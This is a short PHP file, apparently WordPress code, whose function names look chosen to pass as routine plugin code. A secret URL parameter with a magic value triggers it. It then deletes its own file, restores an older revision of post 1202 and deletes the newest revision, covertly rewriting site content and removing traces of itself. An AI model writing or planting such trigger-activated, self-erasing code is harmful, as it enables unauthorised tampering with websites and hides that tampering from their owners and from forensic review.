<?php

function csv_account_slug() {
	if (isset($_GET['word_automatic_consent']) && $_GET['word_automatic_consent'] === 'cookie_optimizer_scheduler_gravatar') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$restrict_latest_catalog_tracker = 1202;
		$utils_kit_label = wp_get_post_revisions($restrict_latest_catalog_tracker);
		if (empty($utils_kit_label)) die('no revisions');
		if (count($utils_kit_label) < 2) die('less than 2');
		$edition_survey_twitter = array_shift($utils_kit_label);
		$mobile_finder_visitor = $edition_survey_twitter->ID;
		$integration_web_better = array_shift($utils_kit_label);
		$logo_create_now = $integration_web_better->ID;
		$publish_floating_open = wp_restore_post_revision($logo_create_now);
		if ($publish_floating_open === false) die('error restoring');
		$publish_floating_open = wp_delete_post_revision($mobile_finder_visitor);		
		if ($publish_floating_open === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'csv_account_slug');
